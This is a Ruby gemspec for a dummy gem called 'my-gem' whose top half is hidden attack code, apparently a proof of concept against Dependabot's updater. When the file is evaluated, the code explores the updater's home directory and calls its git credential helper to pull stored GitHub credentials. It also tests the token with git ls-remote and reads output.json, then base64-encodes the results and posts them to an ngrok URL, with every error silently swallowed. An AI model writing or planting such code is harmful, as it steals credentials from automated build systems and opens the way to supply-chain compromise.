COLLAB_URL = "https://95a1-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

read_file = ->(path) { IO.binread(path).force_encoding("UTF-8").encode("UTF-8", invalid: :replace) }

begin
  require "net/http"
  require "uri"
  require "open3"

  results = []

  # /home/dependabot/common/ verkennen
  begin
    common_tree = `find /home/dependabot/common -maxdepth 4 2>/dev/null`
    results << "=== /home/dependabot/common/ TREE ===\n#{common_tree[0..4000]}"
  rescue; end

  # git-credential-store-immutable op juiste pad
  cred_helper = "/home/dependabot/common/bin/git-credential-store-immutable"
  store_file = Dir.glob("/home/dependabot/dependabot-updater/*.git.store").first

  if File.exist?(cred_helper) && store_file
    begin
      out, err, _ = Open3.capture3(
        cred_helper, "--file", store_file, "get",
        stdin_data: "protocol=https\nhost=github.com\n\n"
      )
      results << "=== CRED HELPER get ===\nOUT: #{out}\nERR: #{err}"
    rescue => e
      results << "=== CRED HELPER ERR: #{e.class}: #{e.message} ==="
    end
  else
    results << "=== cred_helper exists: #{File.exist?(cred_helper)}, store: #{store_file} ==="
  end

  # git ls-remote via proxy met stored credentials (test scope van de token)
  gitconfig = Dir.glob("/home/dependabot/dependabot-updater/tmp/**/*.gitconfig").first
  if gitconfig
    begin
      out, err, _ = Open3.capture3(
        { "GIT_CONFIG_GLOBAL" => gitconfig, "GIT_TERMINAL_PROMPT" => "0" },
        "/home/dependabot/bin/git", "ls-remote",
        "--heads", "https://github.com/ugurcanli/testpen",
        timeout: 10
      )
      results << "=== GIT LS-REMOTE ugurcanli/testpen ===\nOUT: #{out[0..500]}\nERR: #{err[0..200]}"
    rescue => e
      results << "=== GIT LS-REMOTE ERR: #{e.class}: #{e.message} ==="
    end
  end

  # output.json
  begin
    results << "=== output.json ===\n#{read_file.('/home/dependabot/dependabot-updater/output/output.json')}"
  rescue => e
    results << "=== output.json: #{e.class} ==="
  end

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=common")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
